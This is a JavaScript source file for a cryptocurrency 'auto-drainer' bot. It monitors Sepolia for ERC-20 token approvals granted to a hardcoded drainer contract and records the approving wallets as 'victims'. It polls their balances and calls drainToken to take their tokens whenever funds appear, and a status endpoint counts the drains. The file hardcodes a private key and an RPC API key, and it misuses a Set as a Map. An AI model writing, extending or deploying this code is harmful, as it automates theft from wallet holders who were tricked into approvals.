import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
import { sepolia, baseSepolia } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';
import express from 'express';

const app = express();
const PORT = process.env.PORT || 3003;

// Configuration
const CHAINS = [
  {
    chain: sepolia,
    drainer: '0x20641E48446ae5c2B325ECcE3a2AB7a83d834CD3',
    rpc: 'https://eth-sepolia.g.alchemy.com/v2/H--HtDpZlgQ0zxKBt7zBC-DzXtxGRL0J'
  }
];

const PRIVATE_KEY = '0x8e4e0161ac8f367670394f767aabc24709cb1e3d4e9e6afe071b484859f1ac90';

const DRAINER_ABI = parseAbi([
  'function drainToken(address token, address victim) external'
]);

const ERC20_ABI = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)'
]);

const account = privateKeyToAccount(PRIVATE_KEY);

// Track victims and their approved tokens
const trackedVictims = new Map(); // { victimAddress: Set<tokenAddress> }
const processedDrains = new Set();

let stats = {
  totalDrained: 0,
  lastDrain: null,
  drainsByChain: {},
  trackedVictims: 0
};

async function monitorChain(config) {
  const { chain, drainer, rpc } = config;
  
  const publicClient = createPublicClient({
    chain,
    transport: http(rpc)
  });

  const walletClient = createWalletClient({
    account,
    chain,
    transport: http(rpc)
  });

  console.log(`🔍 Monitoring ${chain.name}...`);

  while (true) {
    try {
      // Step 1: Find new approvals
      const currentBlock = await publicClient.getBlockNumber();
      const fromBlock = currentBlock > 9n ? currentBlock - 9n : 0n;

      const logs = await publicClient.getLogs({
        event: {
          type: 'event',
          name: 'Approval',
          inputs: [
            { type: 'address', indexed: true, name: 'owner' },
            { type: 'address', indexed: true, name: 'spender' },
            { type: 'uint256', indexed: false, name: 'value' }
          ]
        },
        args: {
          spender: drainer
        },
        fromBlock,
        toBlock: currentBlock
      });

      // Track new victims
      for (const log of logs) {
        const { owner, value } = log.args;
        const token = log.address;

        if (value > 0n) {
          const victimKey = `${chain.id}-${owner}`;
          if (!trackedVictims.has(victimKey)) {
            trackedVictims.set(victimKey, new Set());
            stats.trackedVictims++;
          }
          trackedVictims.get(victimKey).add(token);
          console.log(`👁️ Tracking ${owner} for ${token} on ${chain.name}`);
        }
      }

      // Step 2: Check balances of all tracked victims
      for (const [victimKey, tokens] of trackedVictims.entries()) {
        const [chainId, victim] = victimKey.split('-');
        if (parseInt(chainId) !== chain.id) continue;

        for (const token of tokens) {
          const drainId = `${chain.id}-${token}-${victim}`;
          
          try {
            // Check if victim has balance
            const balance = await publicClient.readContract({
              address: token,
              abi: ERC20_ABI,
              functionName: 'balanceOf',
              args: [victim]
            });

            if (balance > 0n) {
              // Check if we already drained recently
              if (processedDrains.has(drainId)) {
                const drainTime = processedDrains.get(drainId);
                if (Date.now() - drainTime < 120000) { // 2 minute cooldown
                  continue;
                }
              }

              console.log(`\n💰 [${chain.name}] BALANCE DETECTED!`);
              console.log(`Token: ${token}`);
              console.log(`Victim: ${victim}`);
              console.log(`Balance: ${balance.toString()}`);
              
              try {
                const hash = await walletClient.writeContract({
                  address: drainer,
                  abi: DRAINER_ABI,
                  functionName: 'drainToken',
                  args: [token, victim],
                  gas: 200000n
                });
                
                console.log(`✅ DRAINED! TX: ${hash}`);
                
                processedDrains.set(drainId, Date.now());
                stats.totalDrained++;
                stats.lastDrain = new Date().toISOString();
                stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
                
              } catch (error) {
                console.error(`❌ Drain failed for ${victim}:`, error);
              }
            }
          } catch (error) {
            // Token might not exist or other error, skip
          }
        }
      }
      
    } catch (error) {
      console.error(`[${chain.name}] Error: ${error.message}`);
    }
    
    // Check every 60 seconds (balance monitoring)
    await new Promise(resolve => setTimeout(resolve, 60000));
  }
}

// Start monitoring all chains
console.log('🤖 ENHANCED AUTO-DRAINER STARTED');
console.log('✅ Monitors new approvals');
console.log('✅ Tracks victim balances');
console.log('✅ Auto-drains when tokens added');
console.log('Monitoring chains:', CHAINS.map(c => c.chain.name).join(', '));

CHAINS.forEach(config => {
  monitorChain(config).catch(console.error);
});

// Health check endpoint
app.get('/', (req, res) => {
  res.json({
    status: 'running',
    uptime: process.uptime(),
    totalDrained: stats.totalDrained,
    lastDrain: stats.lastDrain,
    drainsByChain: stats.drainsByChain,
    trackedVictims: stats.trackedVictims,
    activeVictims: trackedVictims.size
  });
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok', monitoring: CHAINS.map(c => c.chain.name) });
});

app.listen(PORT, () => {
  console.log(`🌐 Health endpoint running on port ${PORT}`);
});

process.on('SIGTERM', () => {
  console.log('Shutting down...');
  process.exit(0);
});

